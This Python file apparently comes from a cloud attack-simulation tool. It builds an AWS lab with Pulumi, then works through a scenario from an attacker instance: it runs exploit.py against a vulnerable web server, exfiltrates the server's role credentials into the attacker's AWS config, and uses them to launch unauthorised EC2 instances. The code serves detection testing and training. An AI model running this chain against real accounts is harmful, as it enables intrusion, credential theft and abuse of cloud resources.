import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from core.report import gen_report


def scenario_1_execute():
    print("-"*30)
    print(colored("Executing Scenario 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
    generate_ssh_key()
    loading_animation()
    print("-"*30)
    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)
    
    base_directory = os.path.abspath('.')
    sub_directory = "core"
    file_name = "aws-scenario-1-output.json"
    file_path = os.path.join(base_directory, sub_directory, file_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))
    subprocess.call("cd ./scenarios/scenario_1/infra/ && pulumi up -s aws-scenario-1 -y", shell=True)
    subprocess.call("cd ./scenarios/scenario_1/infra/ && pulumi stack -s aws-scenario-1 output --json >> ../../../core/aws-scenario-1-output.json", shell=True)
    
    print("-"*30)
    print(colored("Bringing up the Vulnerable Application", color="red"))
    loading_animation()

    sleep_duration = 300
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    print("-"*30)
    print(colored("Export Meta Data of Infra", color="red"))

    print("-"*30)
    print(colored("Get into the attacker machine - Tor Node", color="red"))
    loading_animation()

    with open("./core/aws-scenario-1-output.json", "r") as file:
        data = json.load(file)

    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
    ATTACKER_SERVER_INSTANCE_ID = data["Attacker Server Instance ID"]
    WEB_SERVER_INSTANCE_ID = data["Web Server Instance ID"]
    SUBNET_ID = data["Subnet ID"]
    AMI_ID = data["AMI ID"]
    KEY_PAIR_NAME = data["Key Pair Name"]
    REGION = data["Region"]

    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)

    print("-"*30)
    print(colored("Running exploit on Remote Web Server", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 exploit.py "+WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)

    print("-"*30)
    print(colored("Initiate EC2 takeover, got Shell Access", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Exfiltrate Node Role Credentials and loading Creds in Attackers Machine", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Role Details", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)

    print("-"*30)
    print(colored("Anomalous Infra Rollout", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" ""aws ec2 run-instances --image-id "+AMI_ID+" --instance-type t2.micro --key-name "+KEY_PAIR_NAME+"  --subnet-id "+SUBNET_ID+" --region "+REGION+" | jq '.Instances[].InstanceId'""", shell=True)

    print("-"*30)
    print(colored("Generating Report", color="red"))
    loading_animation()
    gen_report(ATTACKER_SERVER_INSTANCE_ID, ATTACKER_SERVER_PUBLIC_IP, WEB_SERVER_PUBLIC_IP, WEB_SERVER_INSTANCE_ID)
